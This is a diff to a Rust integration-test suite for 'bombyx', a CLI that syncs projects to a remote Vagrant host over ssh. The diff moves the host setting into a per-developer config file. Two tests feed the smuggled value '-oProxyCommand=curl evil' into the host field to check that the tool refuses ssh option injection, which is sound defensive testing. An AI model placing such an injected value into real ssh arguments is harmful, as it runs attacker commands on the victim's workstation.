@@ -5,26 +5,59 @@
 //! VM host.
 
 use assert_cmd::Command;
+use bombyx::config::{CONFIG_DIR_ENV, HOST_ENV, USER_CONFIG_FILE};
 use predicates::prelude::*;
 use tempfile::TempDir;
 
-/// Writes a `bombyx.toml` into a fresh temp dir.
+/// Name of the per-developer config directory inside a fixture.
+const CONFIG_HOME: &str = "config-home";
+
+/// Writes a `bombyx.toml` and a per-developer config naming
+/// `vmhost` into a fresh temp dir.
+///
+/// The project file carries no `host`: bombyx refuses one there.
+/// The host comes from the per-developer file, which is the
+/// ordinary arrangement and the lowest-precedence source, so a
+/// test can override it from any of the other three.
 ///
 /// The returned guard removes the directory on drop, so a
 /// failing assertion cannot leak it into the system temp dir.
 fn project_dir() -> TempDir {
-    let dir = TempDir::new().unwrap();
-    std::fs::write(
-        dir.path().join("bombyx.toml"),
-        "host = \"frosti\"\nproject = \"phren\"\n",
-    )
-    .unwrap();
+    let dir = project_dir_with("project = \"myproject\"\n");
+    write_user_config(&dir, "host = \"vmhost\"\n");
     dir
+}
+
+/// A fixture whose `bombyx.toml` is exactly `source`.
+fn project_dir_with(source: &str) -> TempDir {
+    let dir = TempDir::new().unwrap();
+    std::fs::write(dir.path().join("bombyx.toml"), source).unwrap();
+    std::fs::create_dir(dir.path().join(CONFIG_HOME)).unwrap();
+    dir
+}
+
+/// Writes the per-developer config inside a fixture.
+///
+/// The file name and both environment variables come from the
+/// library's own constants. Hardcoded, a rename would leave this
+/// suite green while it wrote a file bombyx no longer reads and
+/// cleared a variable it no longer honours -- so the hermeticity
+/// below would quietly stop holding.
+fn write_user_config(dir: &TempDir, source: &str) {
+    std::fs::write(dir.path().join(CONFIG_HOME).join(USER_CONFIG_FILE), source)
+        .unwrap();
 }
 
 fn bombyx_in(dir: &TempDir) -> Command {
     let mut cmd = Command::cargo_bin("bombyx").unwrap();
     cmd.current_dir(dir.path());
+    // Hermetic on purpose. The host now comes from outside the
+    // project, so without these two lines every assertion below
+    // would depend on the developer's own `config.toml` and on
+    // whether their shell exports BOMBYX_HOST -- passing on one
+    // machine and failing on the next.
+    cmd.env(CONFIG_DIR_ENV, dir.path().join(CONFIG_HOME));
+    cmd.env_remove(HOST_ENV);
     cmd
 }
 
@@ -60,10 +93,10 @@ fn up_makes_the_dir_then_pushes_then_boots() {
     let dir = project_dir();
     let lines = dry_run(&dir, &["--dry-run", "up"]);
     assert_eq!(programs(&lines), vec!["ssh", "tar", "scp", "ssh", "ssh"]);
-    assert!(lines[0].contains("mkdir -p ~/'vms/phren'"));
+    assert!(lines[0].contains("mkdir -p ~/'vms/myproject'"));
     assert!(lines[1].contains("--exclude=./.vagrant"));
     assert!(lines[3].contains("tar -xzf"));
-    assert!(lines[4].ends_with("cd ~/'vms/phren' && vagrant 'up'\""));
+    assert!(lines[4].ends_with("cd ~/'vms/myproject' && vagrant 'up'\""));
 }
 
 #[test]
@@ -105,18 +138,20 @@ fn up_never_hands_scp_a_windows_drive_letter() {
 }
 
 #[test]
-fn a_local_config_overrides_the_committed_host() {
-    // `host` is per-developer: a team shares one `bombyx.toml`
-    // but each member has their own VM host. Without an
-    // override the committed file names one person's machine.
+fn a_local_config_overrides_the_user_config_host() {
+    // The per-project escape hatch: one repo that needs a
+    // different machine from the one in your `config.toml`.
     let dir = project_dir();
-    std::fs::write(dir.path().join("bombyx.local.toml"), "host = \"fusion\"\n")
-        .unwrap();
+    std::fs::write(
+        dir.path().join("bombyx.local.toml"),
+        "host = \"my-vmhost\"\n",
+    )
+    .unwrap();
 
     let lines = dry_run(&dir, &["--dry-run", "status"]);
-    assert!(lines[0].starts_with("ssh fusion "), "{}", lines[0]);
-    // The rest of the committed config still applies.
-    assert!(lines[0].contains("~/'vms/phren'"), "{}", lines[0]);
+    assert!(lines[0].starts_with("ssh my-vmhost "), "{}", lines[0]);
+    // The committed project config still applies.
+    assert!(lines[0].contains("~/'vms/myproject'"), "{}", lines[0]);
 }
 
 #[test]
@@ -125,7 +160,7 @@ fn a_local_config_is_optional() {
     // absence must not be an error.
     let dir = project_dir();
     let lines = dry_run(&dir, &["--dry-run", "status"]);
-    assert!(lines[0].starts_with("ssh frosti "), "{}", lines[0]);
+    assert!(lines[0].starts_with("ssh vmhost "), "{}", lines[0]);
 }
 
 #[test]
@@ -151,9 +186,9 @@ fn provision_pushes_then_runs_vagrant_provision() {
     let dir = project_dir();
     let lines = dry_run(&dir, &["--dry-run", "provision"]);
     assert_eq!(programs(&lines), vec!["ssh", "tar", "scp", "ssh", "ssh"]);
-    assert!(lines[0].contains("mkdir -p ~/'vms/phren'"));
+    assert!(lines[0].contains("mkdir -p ~/'vms/myproject'"));
     assert!(
-        lines[4].ends_with("cd ~/'vms/phren' && vagrant 'provision'\""),
+        lines[4].ends_with("cd ~/'vms/myproject' && vagrant 'provision'\""),
         "{}",
         lines[4]
     );
@@ -164,10 +199,11 @@ fn scratch_pushes_into_a_project_scoped_dir() {
     let dir = project_dir();
     let lines = dry_run(&dir, &["--dry-run", "scratch", "pr-1234"]);
     assert_eq!(programs(&lines), vec!["ssh", "tar", "scp", "ssh", "ssh"]);
-    assert!(lines[0].contains("mkdir -p ~/'vms/scratch/phren/pr-1234'"));
+    assert!(lines[0].contains("mkdir -p ~/'vms/scratch/myproject/pr-1234'"));
     assert!(
-        lines[4]
-            .ends_with("cd ~/'vms/scratch/phren/pr-1234' && vagrant 'up'\"")
+        lines[4].ends_with(
+            "cd ~/'vms/scratch/myproject/pr-1234' && vagrant 'up'\""
+        )
     );
 }
 
@@ -182,14 +218,14 @@ fn destroy_needs_the_project_name_to_confirm() {
         .args(["--dry-run", "destroy"])
         .assert()
         .failure()
-        .stderr(predicate::str::contains("bombyx destroy phren"));
+        .stderr(predicate::str::contains("bombyx destroy myproject"));
 }
 
 #[test]
 fn destroy_rejects_a_mismatched_project_name() {
     let dir = project_dir();
     bombyx_in(&dir)
-        .args(["--dry-run", "destroy", "not-phren"])
+        .args(["--dry-run", "destroy", "not-myproject"])
         .assert()
         .failure()
         .stderr(predicate::str::contains("does not match"));
@@ -201,16 +237,16 @@ fn destroy_wires_the_subcommand_through_to_a_teardown() {
     // the CLI reaches them and prints the resolved target.
     let dir = project_dir();
     let out = bombyx_in(&dir)
-        .args(["--dry-run", "destroy", "phren"])
+        .args(["--dry-run", "destroy", "myproject"])
         .assert()
         .success();
     let stdout = String::from_utf8(out.get_output().stdout.clone()).unwrap();
     let stderr = String::from_utf8(out.get_output().stderr.clone()).unwrap();
     assert_eq!(stdout.lines().count(), 2, "{stdout:?}");
-    assert!(stdout.contains("rm -rf ~/'vms/phren'"));
+    assert!(stdout.contains("rm -rf ~/'vms/myproject'"));
     // The target the operator can check against reality.
     assert!(
-        stderr.contains("frosti:~/vms/phren"),
+        stderr.contains("vmhost:~/vms/myproject"),
         "must name the target: {stderr:?}"
     );
 }
@@ -268,8 +304,9 @@ fn the_push_archive_really_excludes_dot_vagrant_and_dot_git() {
     let work = TempDir::new().unwrap();
     let archive = bombyx::remote::PushArchive::new(work.path(), "test");
     let cfg = bombyx::config::Config::parse(
-        "host = \"frosti\"\nproject = \"phren\"\n",
+        "project = \"myproject\"\n",
         std::path::Path::new("bombyx.toml"),
+        "vmhost",
     )
     .unwrap();
     let cmds = bombyx::plan::plan(
@@ -341,12 +378,8 @@ fn doctor_judges_the_local_vagrantfile_check_on_its_own() {
     // the VM host answers. Both cases are asserted, because only
     // the pair rules out a check that always returns the same
     // thing.
-    let dir = TempDir::new().unwrap();
-    std::fs::write(
-        dir.path().join("bombyx.toml"),
-        "host = \"nosuchhost.invalid\"\nproject = \"phren\"\n",
-    )
-    .unwrap();
+    let dir = project_dir_with("project = \"myproject\"\n");
+    write_user_config(&dir, "host = \"nosuchhost.invalid\"\n");
 
     let missing = bombyx_in(&dir).args(["doctor"]).assert().failure();
     let out = String::from_utf8(missing.get_output().stdout.clone()).unwrap();
@@ -381,8 +414,9 @@ fn doctor_dry_run_prints_exactly_the_commands_a_live_run_sends() {
     let dir = project_dir();
     let printed = dry_run(&dir, &["--dry-run", "doctor"]);
     let cfg = bombyx::config::Config::parse(
-        "host = \"frosti\"\nproject = \"phren\"\n",
+        "project = \"myproject\"\n",
         std::path::Path::new("bombyx.toml"),
+        "vmhost",
     )
     .unwrap();
     let expected: Vec<String> =
@@ -400,15 +434,12 @@ fn a_dangerous_remote_root_is_refused_at_load() {
     // forbid. They must fail before any command is built, on
     // every subcommand -- not just the destructive ones.
     for root in ["~/..", "/.", "~/.", "/", "~", "vms"] {
-        let dir = TempDir::new().unwrap();
-        std::fs::write(
-            dir.path().join("bombyx.toml"),
-            format!(
-                "host = \"frosti\"\nproject = \"etc\"\n\
-                 remote_root = {root:?}\n"
-            ),
-        )
-        .unwrap();
+        let dir = project_dir_with(&format!(
+            "project = \"etc\"\nremote_root = {root:?}\n"
+        ));
+        // A host has to be resolvable, or the run fails on the
+        // missing host before it ever validates `remote_root`.
+        write_user_config(&dir, "host = \"vmhost\"\n");
         bombyx_in(&dir)
             .args(["--dry-run", "up"])
             .assert()
@@ -452,15 +483,14 @@ fn scratch_rejects_an_empty_name() {
 }
 
 #[test]
-fn a_config_host_cannot_smuggle_an_ssh_option() {
-    // The threat this tool exists to contain: a cloned repo
-    // must not run code on the workstation.
-    let dir = TempDir::new().unwrap();
-    std::fs::write(
-        dir.path().join("bombyx.toml"),
-        "host = \"-oProxyCommand=curl evil\"\nproject = \"p\"\n",
-    )
-    .unwrap();
+fn a_host_cannot_smuggle_an_ssh_option() {
+    // `host` reaches `ssh` as its first positional argument and
+    // neither ssh nor scp honours `--`, so a leading `-` is read
+    // as an option. It can no longer arrive from a repo, but a
+    // per-developer file or a mistyped flag still reaches the
+    // same argv.
+    let dir = project_dir();
+    write_user_config(&dir, "host = \"-oProxyCommand=curl evil\"\n");
     bombyx_in(&dir)
         .args(["--dry-run", "status"])
         .assert()
@@ -470,17 +500,140 @@ fn a_config_host_cannot_smuggle_an_ssh_option() {
 
 #[test]
 fn a_typo_in_the_config_is_reported() {
-    let dir = TempDir::new().unwrap();
-    std::fs::write(
-        dir.path().join("bombyx.toml"),
-        "host = \"f\"\nproject = \"p\"\nvagrantdir = \"x\"\n",
-    )
-    .unwrap();
+    let dir = project_dir_with("project = \"p\"\nvagrantdir = \"x\"\n");
+    write_user_config(&dir, "host = \"vmhost\"\n");
     bombyx_in(&dir)
         .args(["--dry-run", "status"])
         .assert()
         .failure()
         .stderr(predicate::str::contains("vagrantdir"));
+}
+
+#[test]
+fn a_host_in_the_project_file_is_refused() {
+    // The rule the design turns on: the VM host belongs to the
+    // developer, and `bombyx.toml` is committed. Refused rather
+    // than ignored, and the message has to say where the line
+    // goes instead.
+    let dir = project_dir_with("host = \"vmhost\"\nproject = \"myproject\"\n");
+    write_user_config(&dir, "host = \"mine\"\n");
+    bombyx_in(&dir)
+        .args(["--dry-run", "status"])
+        .assert()
+        .failure()
+        .stderr(predicate::str::contains("`host` is not allowed"))
+        .stderr(predicate::str::contains("bombyx.local.toml"));
+}
+
+#[test]
+fn no_host_anywhere_names_every_way_to_set_one() {
+    // The first-run failure. It has to be actionable: an
+    // operator who has never configured a host learns all four
+    // sources from this one message.
+    let dir = project_dir_with("project = \"myproject\"\n");
+    bombyx_in(&dir)
+        .args(["--dry-run", "status"])
+        .assert()
+        .failure()
+        .stderr(predicate::str::contains("no VM host configured"))
+        .stderr(predicate::str::contains("--host"))
+        .stderr(predicate::str::contains("BOMBYX_HOST"));
+}
+
+#[test]
+fn the_host_flag_outranks_every_file() {
+    // Both files name a host, and the flag still wins.
+    let dir = project_dir();
+    std::fs::write(
+        dir.path().join("bombyx.local.toml"),
+        "host = \"from-overlay\"\n",
+    )
+    .unwrap();
+    let lines = dry_run(&dir, &["--dry-run", "--host", "from-flag", "status"]);
+    assert!(lines[0].starts_with("ssh from-flag "), "{}", lines[0]);
+}
+
+#[test]
+fn a_flag_host_says_where_the_host_came_from() {
+    // With a `bombyx.local.toml` present, the "overrides" notice
+    // otherwise reads as "the host in that file is in force"
+    // when the flag actually won. `destroy` runs `rm -rf` on the
+    // winner, so the two notices must not disagree.
+    let dir = project_dir();
+    std::fs::write(
+        dir.path().join("bombyx.local.toml"),
+        "host = \"from-overlay\"\n",
+    )
+    .unwrap();
+    bombyx_in(&dir)
+        .args(["--dry-run", "--host", "from-flag", "status"])
+        .assert()
+        .success()
+        .stderr(predicate::str::contains("host from-flag from --host"));
+}
+
+#[test]
+fn an_overlay_without_a_host_does_not_claim_the_host() {
+    // The gap between the two notices. A `bombyx.local.toml`
+    // setting only `remote_root` still prints "overrides", which
+    // reads as "the host in that file is in force" -- while the
+    // host actually came from the per-developer file. The
+    // provenance line has to name the real source.
+    let dir = project_dir();
+    std::fs::write(
+        dir.path().join("bombyx.local.toml"),
+        "remote_root = \"/srv/vms\"\n",
+    )
+    .unwrap();
+
+    let out = bombyx_in(&dir)
+        .args(["--dry-run", "status"])
+        .assert()
+        .success();
+    let stdout = String::from_utf8(out.get_output().stdout.clone()).unwrap();
+    let stderr = String::from_utf8(out.get_output().stderr.clone()).unwrap();
+
+    // The overlay is in force for the field it does set.
+    assert!(stdout.contains("/srv/vms/myproject"), "{stdout}");
+    // The host came from the per-developer file, and nothing may
+    // attribute it to the overlay.
+    assert!(stdout.starts_with("ssh vmhost "), "{stdout}");
+    assert!(
+        !stderr.contains("host vmhost from bombyx.local.toml"),
+        "{stderr}"
+    );
+}
+
+#[test]
+fn an_invalid_host_does_not_blame_the_project_file() {
+    // The project file is the one file forbidden to carry a host,
+    // so an error about a bad host must not be prefixed with
+    // "loading bombyx.toml" -- that sends the operator to edit
+    // the wrong thing.
+    let dir = project_dir();
+    write_user_config(&dir, "host = \"-oProxyCommand=curl evil\"\n");
+    let out = bombyx_in(&dir)
+        .args(["--dry-run", "status"])
+        .assert()
+        .failure();
+    let stderr = String::from_utf8(out.get_output().stderr.clone()).unwrap();
+    assert!(stderr.contains("must not start with"), "{stderr}");
+    assert!(stderr.contains(USER_CONFIG_FILE), "{stderr}");
+    assert!(!stderr.contains("loading bombyx.toml"), "{stderr}");
+}
+
+#[test]
+fn the_host_env_var_outranks_the_files() {
+    // Between the flag and the files: useful in CI, or for an
+    // agent driving bombyx with no config directory of its own.
+    let dir = project_dir();
+    let out = bombyx_in(&dir)
+        .env("BOMBYX_HOST", "from-env")
+        .args(["--dry-run", "status"])
+        .assert()
+        .success();
+    let stdout = String::from_utf8(out.get_output().stdout.clone()).unwrap();
+    assert!(stdout.starts_with("ssh from-env "), "{stdout}");
 }
 
 #[test]
